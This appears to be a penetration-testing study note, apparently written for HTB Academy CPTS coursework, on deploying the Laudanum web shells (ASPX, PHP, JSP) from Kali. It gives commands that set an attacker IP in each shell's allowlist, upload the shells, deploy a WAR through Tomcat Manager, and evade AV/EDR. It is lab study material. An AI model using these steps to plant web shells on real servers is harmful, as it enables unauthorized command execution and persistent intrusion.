# Laudanum

**Tags:** `#laudanum` `#webshells` `#payloads` `#aspx` `#php` `#jsp`

Collection of injectable web shell files for multiple languages (ASPX, PHP, JSP, CFML). Each shell restricts access by IP address — edit to whitelist your attack host before deploying. Pre-installed on Kali.

**Source:** https://github.com/jbarcia/Web-Shells/tree/master/laudanum
**Install:** Pre-installed at `/usr/share/laudanum/`

```bash
ls /usr/share/laudanum/
# aspx/  jsp/  php/  cfm/  ...
```

> [!note]
> Always edit the shell to set your allowed IP before uploading — without it, anyone can use the shell. Copy to working directory first, edit, then upload.

---

## Setup

```bash
# List available shells
ls /usr/share/laudanum/
ls /usr/share/laudanum/aspx/
ls /usr/share/laudanum/php/

# Copy to working directory before editing (php shell is shell.php, NOT php.php)
cp /usr/share/laudanum/aspx/shell.aspx .
cp /usr/share/laudanum/php/shell.php .
```

---

## ASPX Shell (IIS)

```bash
# Copy and edit
cp /usr/share/laudanum/aspx/shell.aspx .

# The allowlist is an ARRAY (~line 59), not a single string:
#   string[] allowedIps = new string[] {"::1","192.168.0.1", "127.0.0.1"};
# Replace one of the entries with your tun0 IP:
sed -i 's/192.168.0.1/10.10.14.5/' shell.aspx
```

Upload to target, then browse to:
```
http://target/uploads/shell.aspx
```

---

## PHP Shell

```bash
cp /usr/share/laudanum/php/shell.php .

# Edit allowed IP (~line 47) — it's an array with placeholder IPs:
#   $allowedIPs = array("192.168.1.55", "12.2.2.2");
sed -i 's/192.168.1.55/10.10.14.5/' shell.php

# Upload and access
curl http://target/uploads/shell.php
```

---

## JSP Shell (Tomcat / Java)

The jsp dir ships a **prebuilt `cmd.war`** (plus `makewar.sh` and a `warfiles/` source dir) — there is no standalone `cmd.jsp`.

```bash
ls /usr/share/laudanum/jsp/       # cmd.war  makewar.sh  warfiles/
# Deploy cmd.war via the Tomcat Manager (/manager/html) → browse /cmd/cmd.jsp
# Or rebuild from warfiles/ after editing the IP restriction:
cd /usr/share/laudanum/jsp && ./makewar.sh
```

---

## What Each Shell Provides

| Feature | Details |
|---------|---------|
| Command execution | Run system commands via input field |
| IP restriction | Only your whitelisted IP can use it |
| File browser | Some variants include directory listing |
| File upload | Some variants support secondary uploads |

---

## Shell Locations on Kali

Verified against the Kali package layout (`/usr/share/laudanum/`):

```
aspx/   → shell.aspx
asp/    → shell.asp, dns.asp, file.asp, proxy.asp
php/    → shell.php, php-reverse-shell.php, dns.php, file.php, proxy.php, host.php, hidden.php, killnc.php
jsp/    → cmd.war, makewar.sh, warfiles/   (no standalone cmd.jsp)
cfm/    → shell.cfm, application.cfc
wordpress/ , helpers/
```

---

## OPSEC

- Shells write to disk — detectable by file integrity monitoring and AV
- Access from a single IP; avoid browsing from non-whitelisted hosts
- Remove the shell after use
- Laudanum shells are well-known signatures — AV/EDR may flag them; use Antak or a custom shell for evasion

---

> [!note] **See also** — PowerShell/ASPX web shell with an interactive console: [[Tools/Payloads & Shells/Antak|Antak]]. Cleaner single-file PHP option: [[Tools/Payloads & Shells/WhiteWinterWolf PHP Webshell|WhiteWinterWolf PHP Webshell]]. Getting the shell onto the target: [[Class notes/HTB Academy/CPTS v2 (claude)/Exploit & File Transfers|Exploit & File Transfers]], and the upload-filter bypasses in [[Class notes/HTB Academy/CPTS v2 (claude)/File Upload Attacks|File Upload Attacks]].

---

*Created: 2026-03-13*
*Updated: 2026-08-31*
*Model: claude-opus-5*
